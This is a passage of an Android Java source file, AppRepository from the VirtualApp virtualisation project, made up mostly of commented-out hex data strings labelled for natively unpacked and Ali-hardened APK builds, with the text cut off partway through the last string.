package io.virtualapp.home.repo;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.support.v4.content.FileProvider;

import com.lody.virtual.GmsSupport;
import com.lody.virtual.client.core.InstallStrategy;
import com.lody.virtual.client.core.VirtualCore;
import com.lody.virtual.helper.utils.Base64;
import com.lody.virtual.helper.utils.MD5Utils;
import com.lody.virtual.helper.utils.RSAUtils;
import com.lody.virtual.remote.InstallResult;
import com.lody.virtual.remote.InstalledAppInfo;

import org.jdeferred.Promise;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.security.interfaces.RSAPrivateKey;
import java.text.Collator;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;

import io.virtualapp.abs.ui.VUiKit;
import io.virtualapp.home.models.AppData;
import io.virtualapp.home.models.AppInfo;
import io.virtualapp.home.models.AppInfoLite;
import io.virtualapp.home.models.MultiplePackageAppData;
import io.virtualapp.home.models.PackageAppData;

/**
 * @author Lody
 */
public class AppRepository implements AppDataSource {

    //原生脱壳的APK
//    private String partData = "6B9F90685E573273041DA37708D59A59EFCCCF29BF370ED1677C2A41144138AB38B864BFB852819E7B6F5E0AA59C4403084598921B0B6DB0CEDE80C7CEE0BDBDF497828F7D2D25A662FD08386A0051489AD2C31F0135E765D077B377184FDCBC0184FCDBE0869658CA90F2FD9708A2DC08BE8B3FFDB8C1F8699819610D8E987C6F6A5C1890297DFF4A908D56FE9348F02735F69151673690FDD34C0A3CB169A861BD1CD9B8ABB771B53B1F68EE8AF85DA4EE8B1B43B517E1FEE2B650A8EBE04A54A09EAD9E1EFEE6153DAE763D2CAEC53A251DBC3F7C0737D4B318F348C92F9488634B0BE039A51EECA6AF2AAB5ACF29D3C9C7311938B20CFB788240D7869DA784FFC18C513A5195A61D4D8EC473EE49F2F32D79185B07D4F8A85F4CF4BE28BB42DE7EE2DB54C3798249C1F56814DD22003A1301419BECB664DB35517D86AF7552374ABE7975B3EBCB1678E2EC489D1FBCDC38BB557408D719EBFE0F02D7C329F441314295F2505AC105A3983EBDC2836C4BB2B0AC3D7D60924BB8A13F01A9C080CAE1A628822A7377698A51B68C5845B15072B8CF8D7349EC27E32DC12C39E7DF9135458DF6ADAAFAE1E77EE0F65167552CAD73E63F1FBE4F0E778E117A0C6948EEFD52056D1D9045CE59C94444482D0CCD91750324ED5F9C24D2C486EA57DFC8E8559E8241409A8EB0C0199EF3CB6339CBE781420A6F896C28F3D86EA744BA5700D5C0ED96DFB5304441ED4D1CD2C06D08171DBBBBE228C6445284C6C9F581ACB40243F86E5A815E6FDBDE1D5A22F9BD2A969FC9415F9DAF4520707DBD11B5CF95B9FFBF3D6813D5D2B32E09B07C2ECFC7D4F834DA87B4F67104E8D60A7A25EB0765FE459F4390F04E6309B3EDA2A9B107F0F95107602973A4548440E583EC8CAB2D881F9EA05884247E0FD20F7D6FB9C738C82A9D03CEE36ECC536E69CB17E57D31D4EE2388F628D9D33113E819F4C7FF9172A13B289A91C9CD53EE12997C7F4F887863911C26EDEF559D166622767923A3C84431D630CBAC82921C191BE03621AFD91C222F493C88A08B0B86E78CF78721A1E0C58CC0F7F74C8F7D2D61CB0AE25A57C09F806B7B9E3E33958C264F660DEA9222A8856A83FB5D7433998A01729C8890FD303C73A9EAA47D68E6468F381D6A05A516E6F4510CE33EF25BDA5273EC2610E299E46A33B16FDB1101EA131A6590E9CA8ECB6EB6FA3F469AC7EEE9D5BC3545F812F71225236D21E6FA66E57369AA0749C9BE776CA2555F58AC0F1E02EEF2189921ACD1232475E2AFF29FDA189011570971B20204EAFB5D4DE7552D84F5AC84E17D2B6394A5CEF268CE4CE77FA4D5C2ED87D7F67B592C6F52DF54ADBFEE48594C356A72D737A4FF367DA5396DAB23947AA4A4384DA9D7AA0FB80573986FA29440FEC9EDE137D61881CBFE652E9F78450658E3DF52459EDFC51E5AA72BC85248B81C71D9DB1713F8F64BC5FF4C52993A9B7F73913617F6CDAD8EDBD1AEBE21E00C0E55EA8B209AEF74D89C377C87CD6AFD5B10C7125FCA2DD4D2BC60AA030C9910938F232A9B6EDAAB0367F750A669C1547A12497D0AAC2C9F1BBA1AB4F89717860DB12C80701911EA1CC6E8DB04378C64702493B53A95096689AC9714D36E7B568FF719565210279C92374E0FBAF680AE9120DB4CAAE0AE85C4E97A9EFFA03C8DC9876FDB570B4A95DFB920C1CD2A036F29323013939E4D5A2636C6AEB2460AD9471B84AC84DF76F9FA7C55881D1BC9300983DF9E45E33240B23F78F4B4A9451ED929447561B8836FB29D0C045D007A11133BCD8D08D930DF1792008E9F3207BEACA2B655220E2ED2CBDD311729BB728B1D07D537ABF8980A08C7B70C54833A6BE0EDA5922C1A3C9D18CC60BC24511973CF0AE35510FAAFCDF2F948DBEDFFE8CFDC859FA47259F2EF7007A087CD4A02462D03E6495702B5BD22D1C9FFB00AB8B74629C0ACC119FB32C62D192D56A2BDB81F2A6831441FB0CF1D952E7ED8A685AC2B95BD7ACEF9974A98321398C7A332338DF203619B6E3284E5F5338489C55D6DEBBB6DD414F3101A4F91EBE0970A15A837A049E66600755F01B17509F215DA2B771086888859925CF4D820F0D878205407F3E7A3D1E2E931C87F22E834C313B8D515CAB76753F981E9EB9EEBF52C1A634CE2B24173BBDE443B0A28";
    //阿里加固的APK 3217
//    private String partData = "3EE56734F2C3D38AEBBF60896619C277D315718B26FDE1E678456AC1F716C8031E11FE82D08B7E6E3F84C75611920364D3DCA3EADEFC60FC46FA2F7B1056DADD41050EB6C7E140912CD27D33899F9B4F2F55F01206006A6444795E7CE638E6366744AC435F24AD80A9559605130A204C25BECDC3971DAB3BC9662C573488F3C3226B80BC277183607116C296671087CFAE6C184B6FFEC28D91012C77BD91892D17DDFE4F7233D866D49B4FDBDC911260706BA9AE5D3045661ADBEE91A84C4C30B5A837C8A2E91E92D0389276CE3301CAAD8952216E3F1C080B37164BEAFB3A1902645BEFA700DCDC7F4309152B5A59FA975E0F3B45F16EB743B6B5A57827313D297FFA9C741EE09BE02A223C1A0BE9D5CDDB727C738BDDDCB532AFE55C6B7853203218E5A277C701E189510198D45CEA3E8311E54917DD57EED365115A1B827F28BDDD3FA6B6290869F10DAB4804E3F643975B7458DF0B8B80BD5DA2CA88360079E4AA668E5425FE6C59EAD67CBC0CFCAC9C5B1A2B73F576FBF46D1226B2C50327C1F941A6E95F9EAB38F87AB222EE46CE76E44DC2A228210403A378A8C87DE3BA179435A3F1A5F0E9CF2AF38734D368CD0B60F19A25F22A17CCF9F3A5A07D6D0CEAE9953765CF72A51BE67F282B0E6BE7784BE68FA94643CC35F7B1E9A76A4BB4F970E6FFC24467978ABA7C9CED4D28811083FA914C9AFFD5DD9A80B24BB1471A01F7B0DDE366005F45C4571A3914374838B177D3B704C8CA71306049F9AA18BECB00B4CFA3182830B058CCF08A5F5EDA1E0FFFBA35C00BAE22DF7A3185D0D97441ACF3EEB717147CF1C8928E71EA460F6B9195E256D912BF996E80C230226BFFCBDD1B3B5E6C7A9ECB2C359F1B1E57B34AA0B43B4613DFEADF35B07987DF2304F460F84EFC77962E5FE184BAFBF310C3E271AD8EE30BED78541980D9748D7CE33597573A91928F65F4D68C2BCD9CAC2584980540844E12B4EB2EDF4EA4040E7BB3F7DF856E1428DBAB1CD16463685B4370BF021446B86CDF74EA409685B22BE0903FE260A3FE494C5379B4328BE0E4E03257C995A575FED6F6C5A019ECC70A415994538B4A3F0CEB444BDB967F8B93B83AD92DD5CF1CD82303B7D7BCFFAEA8ECED6828BCE99772ABEEE95255FF035D890FDA7EFC75F20761F0C04FC2BD67929AA93AC6DC0E7227E8D3EA9B6521CBB1BC4166079D3BB142811908FEC979E04A41D5E498D2FAFA11911B50E6C9228D133E9E2100DCC7B05A001C80F9C92AD1003E160CA2CA552B51DCFD20A30905642C0582FCC2C5B8ABE2200ACCC192698878D7F0826901BA64DD743C655B7960EE8C940EEB71935C58F1759FA5488221874FF81DDE1FEB5343DAB3F30E7959193B87D5E83F1CEBC43B34810A64186F692531115E6E84D5BA1A1810BD1A7987D201EB096FC4789524130B44A8CA06018202D1296E5443D13754EBD4E0256215E4DEA628A02DCDC812D5DA99670FE24136B17B2F4E32153743E288607CD551A20477E9F89C9D43681778DBE8193996B61AB983A005731747559E493B13D5203525DA611E5B39D1585C07B8132C9B9631781F8E494CF962F951BEE6B3466734C7D5CB818DF6370C88848B25A73DC688F4E31F93459196601A8679358568D93BA646CB663E61781E47A95A475215D0D550FA810A431FF5F64572CF998E546DA0463C12B58D31AC00E9000FE57D66F0B9C5180F3AE45F3BE47C5C827635ED8ED5F99F3557F10B489FFBA62AABBBFE2CA179FC3FF29142DF3045995E9AC93F23EE36B6946F31A51C1BE693074578959A62288B95534339CD8B348789D2982A23F18B282196CBAC3F2299AC80B73DB3FEC77C67B0414DBA02C62BE24F9A86B224C843AD6F2C42195F2E0056BC1E45CB474D6B352E45404FC7FF5C2BA8FFCFDF26843D3B6D8B45925BE12A992167E20C76F4EA4113E3CE8021551EB3964DBB52EE9898F68CA88D27D42C7B3A10526494CE9946CEFFCB312FFF5895AD3A4BF61F1B079DED7477E213E83D8259EEE1E0743DE9D1870198B1C7C8FD4B109A71F022FB7EAF6355AF175549B808C8F09C1AFC15FD36D11C83A418FFA0DF23944D6AE184D117DCE8F69757A16C8EE3C9322C67580430EB637DE53F47EDBD7B6F35AE59D95003151D13AF0F798FDB761658BBC7BA4A4F058761";
//    阿里加固的APK 3218
//    private String partData = "41C0D6B78B835CA1C88FE67C360209CC1BB99B759CD7667D31F40B14EFECFA34B79B40E930C3959B4E195E02ECFCA6873F8BC5BF7B25D639C1BE0179A9146A64071F731125A5C1C95078E64D0B4E78EEE1663F742EDF966E54F475F5DA20F961A647BD500A101BFABB25AFAE2717882D1F814C98BA3745EA7379A58EBD3ACC0A074120B7B7BA2023CF3C8643C5FF8DEC53A26266EC82928CD0A4B9F87DD6660EEE5823764BE9E2861CBC00564F9C4AEC3264FBC884CCF5BCE8189EA5EE7D4CE6966B6E85EFB16B08A788B3706526E521FE7A2D5A8674C5DFFB8500FA281FD6F4B959DBB2A537A564C4CABC1E2CFC9CFC91BDACDA934D382D2623E51BD40B776F5880F08A4B4CDFD2D3BDB7395C6D2D111C485C7C966F8B76EEEF9B50E8E058BFCAC8ACF51E766499D479640656B88F45E2634B657D6288985555A23ABB00B4E809AC7AD5DF73A2FB54561C09AA86906D585B0698FF899F8863C41D74B9E9F2FD7C87FC8A377586CBECACACDDEAEBC9C951C927EF6101830E64A00DECE5606179031136F144493B83970D2585E39BE2E0E567D06BBA603176B816E31783EC8DBF354DBF15DB702FE144E24B46C8DF3E2F0A0AC9D030F5A687588E73E25D7B642E805378D3413C81D692BB7D130CA40E33E36B7416F283A81E180A17145C201CEA541EE6D910C99E465432D6F511FA5F2BD1931FC4721E9EFA4A5B32FBEE20977D25FFF74CF54B068591B5171F6350FF1E37C88F3843A455152C1DB903C16A9FFE0C47FE083CC47AE1D1485D00868A88C2262B8167B2328B73DA83C90D584701E91AE9BBA09D3C475062679E1A454B04A4FF928826622CAE672DF1F651CDB165FFFA311AD7A29D6265A4D492B2D40FAC99A70555A0F9799A1AEC62FB613BA947D26CFD0154FE46EA58AFC931D7944C4FEA7B918C2CCDFE2266862EE7240894CF11E1A8CAFB07E32F675E4606A4F320C6DA15121DF828D3CF0076362F9AFB389C307BD1223C6EC980F264DD53ED7B5453092116E90F0745F60EFECFC679794E80627A6E3AC9F3B50C0F464A6F27D050B8EB91716DF08DF2A7D8FF91673155354E4803592E1DDCEDF9225F815F2624043A42C26877498150AEC050066C9BD331E6856C6D0E2F9C60CCB296E18270208B0BE6C34C3D4D0C99ED4301B14B43E9537E30189F2FDA53207F526CC190B31CA3459A405BFBB9BC230B16E6B29FFE2201E7D86189AA5DE8A01C53F7631CD5ACF6753340C0D5D1AD949C40A94D39389DAD2ADC112E83FB7FFED89227377BEEE3DEE42B4E5C27278D451D07447E3C3E3C0E896A1467115D7E0AED682A994070BB206FC4E9B6B7641A59E921B0497F3A636F696798F1BA50B573F63CA69EE6B71159DE468859B1717A113F9B0F58C119ECD886E5BB926CD126463ABB11AF778363FBC6ED8E32C82783AAC6FDDFDE6AAABB994362517A018764C5D7EED49DD66774C60738990556BB0E205801D25CCB512D4004CEB8C31475AF1E6B894260FABF17FCB7D077BF28281DC20A608A2DA8C5498CE4EA5C32AE0902B9E931F17E1DDC5C9EDA8A7A4348D7E3C65C73C99070CD9B3A1E3EE5DB83EEC499F0F5B3DC554BB962B5A4D954C228AA8FE6677251753324CDF52D6EEF8F2BB923889B2788A8C7A0812C8FB24899574E0F62AF91EB27071580C9A3F3167932EBD87154E726412B9929F57775A0CA4ACD9BD130D53B58A6B752BDA2ECD9536BA06A192E8C3D2B60988EADAE9572037599F0FFDBFFF877082E1EAFAA5517FD34E9E1B948685E8DC77C6ACB9FF89F14B5FBA77CDBE85EF41DEBCBFD471C85D7C23C1B4F3DDC2DB82436775392036AC60798F19DA9D457CB3B7A5E06F11BFC58F8222E3448D9914B8BBD0D2DC3294B3E2CE11A0190DB1D209BF9A94C9632ACF3365218E71096C9AB1EF95419B00337A14E39EF7BCA846B3F114773CC3881A66341C4EF283E901F3AAD7A330033D388B7C0277251AC202821B2340D298A54C69D22D37ABF880C830128DD95EF11986262401ECAEEA8451DE95917AFC3F54014B0AC65CF75F7AD639457DC203823A7FC28540D796316845B60B030907C58629790117CC20E0CE6319C8B15C04E122F43364EB2880B37B65B78C4B1647CEA3D56D57F96A5ACEB1544ABF60FC70ED881150671438E0855DFEBC3DB6E514C77";
//原生3218
//    private String partData = "4C2069C7DDF01086BF37055052EF9154B3139F5F8045BE6A84C5EF4DBC11DD67B19CA6AE62296040FED4F9D8C48E46DD64F4AB9D8BC33370709382785051B8CC68B9677FDAAC19AFD8DB8322DE7C0FF040C9DFE4506DE86E237E2D7B59C89848E5593B9A173080396D5727E0B4A2DF3CF1867B169B79A556A32F3DB13529A790247C3873BC6C27662F9870BDE4A6859D874F65C658232DD7DDE6B8857CF76EFDDC577A5E21742329E38FD8374765193908372D1BB45ADD6516311F5BB22C30DBB0F1E206211D140E089101B1B76D99E138B1A05405D4DEDAB785DFC40C651B1BBDE0B3F472D0AE75BEA1488F0EEDB6AA7F869C7595129BF947F840C8680FEDC61C333517AC22B4579CCA1FD538711F8581CFAE3196AC0367703E47CD203AE6BF298FFA7D5DE421067C876D2BA2CD2434F3EE00E5D082273BBA08EBC69D89C00B44C6FEFF8A2F5D4CEBC183E0D92A24E2739F113EC6E1EA8E529A9A4B3C77F5295EDD68E0D6198C81B0D1D5FEE195F740EFF8E7E14C3C941AF7B6297FB58D5DE08EA6388A762AE109EFAA2332A5336BA05A3954F0CDD96133698E0E1BE953A4E0E38D3B813C6D7EB653C7114D2EAD857E75AAEF2A045E8C2CE941D83C81ADFBD481F353E4B061637531CFBD3E66F78F7AE5544E1377293A861A3D7FE37E32B163AFFFFB2621358107290F2041ECCFE834F482DC97240D38E075B7543BE57CD8E0114B5770002BB1B304F9A0B2C9E6A9085807EAC516CAF277CE56DA20FE4FDD2C2F75995D2503ECF56F0F05EEFCBE715B4EC6130510BA541A2E283E5AD46CBB4960AB67A2C0E21DA73CE6D45C09E58886B9D90A44C3AF913F99EA4CB6FF9259B07D0FECFDE1BA8D897F128BFB4EB1FA6F439DB5C112D94497A0FFF10C5A4AAFEF79428EE5523BBA36610F7AE958B5DA33978CED7C6C5C6B583F5A466C8AF15F9589FD4EDB5A06DDC5700DB512B6592CB9C21AD02D2927F9C759AA0F7B76FC7E5FDFB465FF72CEE3C54D0131C1FE7C083C187680BC1FD5CBCB70772086447910753AE97D393E329AD8139C4B60A158CF7693F223B4220F9F99707E9EC6CD9030F489DF4007C54A40669BFB643A47D5CBEBEDA313340711C7376A580CEADA028A2D3DB31F2533B8B09B3552599736F0E3ECE0B9E3EF07FF03E9C9E2D07190D1535A7D4DF6966082D8E97CE1795F80ED51F2FE3CC620409574986550CD4ABA942F158FD13D13C47FC43485EBAEEF76268BA0880F5D71F49B7F7F64F15232F734F1922EE3F7591DEF11F32A37B52725287F4D21AA6E4CCB1F0594929CBB0300B8C5FD06CF96C1FF05A696AE0244F571F9AE8C784F7DFAD5CED5FE589B9B0CE7DBA6B6A54CC22728B49CC8B052A9A9FF24555E167B57A4408B06858E6A036F247513A7D5885A12FCA0C0712C3C21ABDF4052BA817A83076D676F08868D841B736F34835AA7BC604154EE364C15255B7E4600998E5220153426F8F7D33D1A4F9CFB3CDCB0DE95744D32E9156FB12386E3649B7E4A9A6446F935401AABF1E9A57171940A966E9C560685A667404EAE921D69720B230861F2B3EA5BA7134EDF5A04FB2E01B1A5995DD84FCD2CC3979A8E94EC9DA2ADF6CBA8E1259D935B87D1270719E78377E8AAC768BAAD14B4F0379A2700AD2F1C154D1FDBDF8787315832A4B634F000E2F735EE135CECCDB28DFC9C93237C2C48081DB17F9C8803B470B7E0577524EB0819FA76AD33F25ED4D660049E21B694AAB050DABF339FE2D5D69F55F9D6EB605F39B33D1C85ED885C3B63E9BE73069ADBF0E8F5D044601252E98E4501078DA51226921D908E8B53DA42962224679C0EBCAE80BF7E28C83B5AB1C876DDEBC60E30B496DD2FACB28CDE0D9CCC35AC0D4D7BAB9655F80ADB3167D38F031FD3F3E0859723A9099683902E3ED73A4D64769FA5299E74C263FC7BA569E299713ECC647D5A58F9AF043CB5E9E9A8677AC7D8804531968B03AF999742C2E619F1402E2461E8894509CE573F2AD12C3AD32468841C657D83794B2DF9C8C57E1F5EFECDE94D8349B18E9CED7D4E6E360D5117B4637A9661E7AC0BD17764B609E3BADC1DA60DEC5835372D560FB119FD359D021645C82ACA5C1545E1706C47084CD7E0DBC00D5E6D27143E1DAEE0AB62D50C9A844DBFB609B12AC05643C041F9997B018934";
    //原生 3223
//    private String partData = "87C7A4E405B9208BE4EB520F218B5E87216A23A2CA4024FCE4BC0DF8ECBB84A4DA22A65DE6163066D8E4FA56C6E4824870285BE6877139EA3C96D2BCA1BA0546B28F0454530F1530E255A5F07EDD83B19839D46767DE11DACA539D247CDBF7FB38CF694C54A80A002829E1DE1F13B7603924ED80B11244DA9D6B18288B68F16962227C6A5BD648858071A805E2E2D022936467F4581D6FC440F9D0E000E0A71A2B8B7AB1AC603B4246185EB2A62136BDA0480AF2577A1771E12CDF40DF527776BBF7B311882AA16913E14C1E3F1793A8E20E80EE609B1A3BBE34BF8EE9BE7BB3BCCD4E84559EB76D30179F4591D4D2A80386285EA339FB2929DDD55B505DEB617C3F33FD1B488A80B9789D6B92C5E2578B667D6C8B34A9B470CD4CE742070A7ACA2C2830EB27E253A6822B513D5282E5846EF5725464E67DD3D735552D798FF0A040CD221BE747DF8CEFDCB1A532DB08DFE0091BC7BEE5093959A59D889368DB034AE7B1FC94440E5427FE6FB511A5EEAACF1D3F61222FBD03472AAC6DA9743A87A83E5B6D7825500B6699D8099B7B2F59C032B1040F610166EF15C143D390CE6CFBC939FF81F2BF98B8A94BA8A77C6D2D3748B07136B15A7CA084E21A2A614DEC8BE5A09702BC690E611CB063052D88AC41EBC02241DA5AA2E399DAD9EA0D2151B9A0E542A32E90533E9AD5490DEF13EFF6F9FF4EFA08C25E132625EBF4BC931260B3D5ABB4EFD6CF8028641D9FD2FD479225D9CDBFC3F2B67165927829E9C8C45D6B99477941A58D16908CFD3EA3C344C8217E42ADA457128335C6F9CCF37823FB846702B23A83DC0BE4C7CF1DC4872391B5256FBC44E749D7D75F41F6444ECE668593500D1D1B2D0E5BEB195C288719F9D2985EE6419B93D90DCBD4FC49C1206737F73CEA2E89BD9102BEA94AD09C23D2D1232544E08E4BC7A71BA2AE365914E753D2D2AB45F18E1B5B664380CB98286E220F666725F9E93255FDDDA253EFC47ADED5BD92C60869A4DC894C841927337E9F19F40B4F24F66A630F43564E19CEC33511B441C633094168791876F96C88DBB5C05B34CE27525F39BEE1221629120233A6713676652BB22FC2CBB10E5A1304B43EB54AA88F2E311DD59125EB4E8D89EEE2B4E554B7E757BD7F82CFBCE1BE2AE009F2221DE3D1BFC017C769949CB7CB58A7AA4EDB71129165CABB30D58F2A84E0B68B886CE27D64723DB3A2C4EB3AA2E7227155349455BC5004A0810039CAB90985610BF9DFE113C24C358105C0397908580810101B143BA0BBA813CB9F8B8192AC35B7B112352F3690455D53724D5C32FD1DDC13A0D864834A470D749754B6F4B146D4484CF955D32114E58F9334DFC2A0AD60BCB2F598F7B89F99A516A24931887AF52403A19548B7C7B08B97D0FBF7307D01FCD9E582B623E96423E4DD650C7BC0D729251A26D6493DB919E38D69F07F664EE6FB56E53260AEA539731AE704BA2E8973A7E51BBEBC53C0CC3D616FA2AB6B970F45D4242D6FF0F57EE104B516F51AD35D0341A3E7BE3316E29B12F927CAA9A609EFD0920045F318C6BE376DBF298272A4D7A5B00B4032EF1A760521F71BB9FF17F41E1465BE3563F7E1E95871B21A4BD6942B6FA73C44D0849129DD484005991A464E67200F1D3944532017F7A70D4FDED8BA4A594EF46511805110E6A8623A48411B6952AB00B2184D085A009B94BAF0E155DEC23B45DDF0D2BD0B8619AC4CDFF8E356A78771372C3D59D45969A12A460978E783D6430E1C87E4B0175D8DB0983DDED2C36B0E8BD5791D787D12324532BC6098E556BDAF9C6E6FDCC7164A1A0F44B84A0E7E7B163C8A75A6DB3121733F907518F44D03F57A8DCE25EB52C80B1E85EEFB1D186E0F4F44FC8DBC1EB6B320AB5938E54AE082CF6228B24A2B29683AC074CE5401A7056E2D90827798EFB9DBB3F5FADAC560B88B97611EC7EFECF98700922CE68C8E5A137AE8F36B167D104D8F79E346A8014BD50E0C65DD811DF63CA43537391375EB0D676D99FFFAFE45EADFDBAB143C69161049989462F902CC986B0D5C2AFC206505164F48BA188083BBD62A391D1B7A9187610B543EEEF04D304FFAAE1409CBEFC2DB37C6A54A707EE266F886AE46DDE65DD3A5F6441A6DB29A80B91814A096B11F3DF951BE4B575DD82472A69A9BE059F48E";
    //阿里 3223
//    private String partData = "3C5E66DA65775AAC53ECC48FD313B227E6B0DA2EDA2A65F600F14EF5D5C0DF52E4E45C459E0B9A26573506A079028E2AC6893A4F6C54D0DC7CD406DF693554DDC0B89B7B7FB2ED5BEC230337DA9197AC402810EF50D9D809CCEB1383A597810B2D17EEEB5DFC846F524982C76D085C939D10679E2036775C217C8585CB359882645B9D79FFC6444270B03CAFFA13EC08EEEED6F612516F6FF602E44EFF8EAB22F214F3712D029209A4D38491C44E3C1A32BE6B1240D85489A444ACE4BF183370F8B5AD48D86E73484D90928099E8F4552D4D12CDA2A4F755B3AC405313AE56B8CDE5F677D8306ED602A56BC28CBDB971F53D91300A7F4FED2C09535EAA469AF075407E39EF3BCA55229DC3E3697C982EC47DA2AA0C3D606391DD570CEBD1C683A8937E4496B522E20CB11EF381D27DF0744060964CD5A0206F217212B22EC9EAAD9736F59403CA2A4DD6916578F914A05FC4561D1AD9104BCA9F56022B0253C3EADFB271E65679E494D964B5E18991FC74B73C50035896B5B89C35B2A44985E2281A445D1C60D6040853772ABE05B77A034CAC723DCEC1B0976D34BC07345F673108523DC98FCFFB605FD037A3E492C61CED8137E35E6BB47050F9C32F2187E88C3F6104E4FFA5B112A77ADB8FC38D4623E8B7E102B9024075AAFC4FAC203958B078D4FCFE121679D1CBA8B188795C2D44D6EE616DC15338D1909ADC109002CB073B27BDC46137E714F09F5E1B035A63BE1DC64D56FB0C9A722E286A76A16AC879A202350E2FC48FD6423658D3F298CAC7ED6070EAA5808D9A26F1EDBF464E6F5F382DA7F6AD6A2D51D668C29095DC361BC5837AE4ACB8D91D5C66537F7D9F1DD6E73EF40EA53317A256BF2E3760E309BA4EF5AD705BF5EDE63BC38E1EDC67D101AC671A84DEB39C9B392810A3A17421E1AEB333ACFA7CC1DA1BB059432D318FB7F29D7EEBA5857BBEF4A0250A8C01B8D8DAD242C49762016F40C882A43C147684917A8A0B16C7C0426D34EB9978E4ED88BB48D64EE99BA43AF7F1B9D3E2C5F10124BB0B427E2EC1C6AD59BD962DAE3F2CF52B7AED9D0AD1CCC1818116E396D32146F904DD0073B6CCA88B505691E20A13F6D88A08E4FDF156B42E9404B48A9917525DCFE878A77DFDADFBB56F8194B1467521A585681B5F27568A0E4F8CF253A46B88452B20DE1CADEA3D18EA56C777CB5BF18F6100D5893E1180E78DC43E4D776BD43E120A38C5BB6A84386AB3C6BECCE68C97DB87C097E441112ADC553533389098A83BFF455F8DA7B9808CB563360448220B08D188A8DBE5783839BD4656936055FA701E98A43158C7C690160C2E94A381B5F2E526E36F4B64C2859F2D01B571AD3D8AB8AB1778E0B2CFD424A7F406B4ED5835CEB306B5A23911201CF1E7FEA917FDE535B2F5416BB3848538E11F9349063F4B17426D439DB747E8A1DA40404A9DED1A73ABEC638CC1D2AEF791391E23AB27D85AE2728B3E6F4B1A7FFD45217A1E8A4310A7F62A4841AA2CB167B55918CCD04CA7B1AA4DE647E14FACE5C1AF657565F4DBF5E29E107E84EC9E3EFBEE1892C2DA09890CDCAFB3760A1BD084D14B9BD69FF76FDBCE73F7121E1BC229CFB1D0887A47F1DF759FDFB3C3CB314D40778F0F51885FF1DD6C0E31E28C43463792ACCE853695016753327D20456FF5266A0F3CA33365CE7B8F0F07E02B98F0198B6CD84BB98C56DA6F45D2805A398CA0CD540D33551DD970E4B77BAE11A48DD677B07F22427BA39D811F1D40A90E4895043A122190FDA2C38EC579EB50AB314624D9C84F1B0FBF9F88B8D2DE8748D413CCE33C2853C4F2ABFB7DF88C1C62A70D797ED4FA277FABAC59FAA349D1E14B2E27BCE6C8FEA1BA415822D028AAB3EBD309DADF1DEDB9D5BAE3DAE6EF2FF9E532F17F897612828FD491921DEFCED26917F8FFCF1AB517A7C271B153E57236A07DE0571441F8E1E795D930A59170017E894BCEDE9A45A1456A6BF40006BCF789391C86DFE925234B9C3A5E3D221898E1CDA95C1556E954DB33F8A9CEF3023DF6694DD6662F10018E20E38EB90DE190750EDD8F7D019C2708308A5EE22F650D8D181BC2DA40B850EE0874CDA19695C457A91FE51B1E5476F8447BB01B1AB16EE21C3ECB1C09D90C8A459E88B0CAD38E35869A195E2C332B81C0344338AAA57E3C";
   //原生3224
//    private String partData = "120F52B4D1A3BB7688A4D7C6154EF54B8A1194C62F05416E9311CF224B2C23B27A0EE0548EF188A230A53E41E10E01F16D799404CE8B0A1DEB2D161F0168E02F42CCD5CF4BFC6F4964D7AF094B6A7051C5BF6A7ACE9B007BA7E64D681572E4A0C222420A8D115EDFE5D13FA0EF46D12E5C291D38BA97FC71D44F40177991F6983E93C5BE7D691E6DD97D4547BCAB6A0FB3F7F2A0BBC4C008A26126DB788FAB12CE6FD83BB785289957A74AC578833EC516EF906D7255D4A14AF1FC8EB646D7615633AB8BBB8B20A359FF4F13B1E571933A68C65B14842EC10558D4E2F30D629424F5BA7E47546E3D62C9BE0D2A3162341EC445C4B06358E32C4BF21D191A2C708BEF324B15B69BC3844448C43A5BC21C31ED6ECF1FB465B71BFF9ECC2E2D417958D44FC5657C518EBB8FA9E85512BD2DFA15627B1FC03FCC44BA798A60208547DD46F3345AEE3580982D31A75228829389B7BD4AD7E644A7D315817B81DA9594B92F4730C01EF3D46F34932A801410F81A5057884200DDEB685A1AC58EBDB2495375BCB5C95D90392088DAA44BF9BCA55F8C60EBC88AA4B12B8FCEFD4B1C6F62193925649C87F371A9C5C96F77D259A9B04700267A83E4FB80041B9740C3A9CC0D5B1366A988186F074A2F4A424B8B48550E3DF27ADB529081DC600D2BBCD0952810AACDCC402524E2100D37D19239EB7AAC51F5ADA8D85FB0E71688AF03F2C20AC76AC0005FB248EF3073CDE105A7E035B10774968446D0DBF2B66485A56907D66A0CED0CFE361AE3EE139DDC2FFEF0E169D6EA40403EECA5A60149BA7B21DCE6654D5569148ACE9D497E82C92BC807EE2414C4386DC32FC11A8AB1FFF0181D453B418729F045B82D41CB1A51573733A925BA474BD7DC393C2999B66A4EE37134513D0D0F6660D83B93F02576E0B93C5ABED5DF61BEFA2BF56741B3CC87BA3263ABDEB7A8945DEFCB7E27CCDB49A58A4E0C4B5B4AE56500524AA71FF1390D3565EB196101C0207D6069E06FE0F1DA555D914D16314E5BD81A33F37CE0174FC34B98D89E5BEB330EF006BECB7CD919DC5F599D109ADED8FBE35FFC241BA1CEBB8536895735EDE3492A009C3C534E3025DFE66FA77356141EE1A2210B3A4DADDF8779369924ACCFF785B5F94CBE02C02BC6AB99138BBBE87F5ACA39DF39CEFCA6B201DCA3D7BEACB811DDAF2073725B8DE75A9F7DA297ECEA606B1E90A326E7C9F2CE0FB6127BC1CFC16F2ED5FAB38EE2C3051A4DDD6D00788D0F8CFEE83302A028E63B8F30F412BFA386D41BB4B1F6CE0CCA0D72AA7A6D34AB1599BBA72C157FA501419B489282C0EA45A87AD360B1DE2C7F4DDDD84D0EF9BF85A8A47F35CD4AEC6243727E99610AADC249C636BD60B9DB330177C95E666EE68B09D43100AECA6EB234BD3C0864D8F463B6B1443B25D0D7EC527CFB3231EFB71B1DFE453830208E20A91BFDC4B4EDFC6F73AFA4381CA98F83488E1AA9D78F7FD1DEFF5B81A67BEAE0B34D2833925198F903990A91A2D07F74892613A464BCF0E25B566817E59FEE381531D42C698CEE08438EC6F3C468B6D9001A98EE1EE93B3E1A968D9319A027DD0AAF9DE329CB93AC5B20DA262CF2A941CEF1BA8BBAA9672482807F01B47D45A601A5A297C951C177A0106C8D9084A3152B3F0D5A32E83E2716CE7195487B7690BA84BDBE7A07BCA7342F686916EC3B86AEB6491FA8EAC73AEB493EDEC7B77A0BB982C240C29057183349B4B3C1D4DC6614443441F2EE533E1D11242150A71BB76743DCE1180904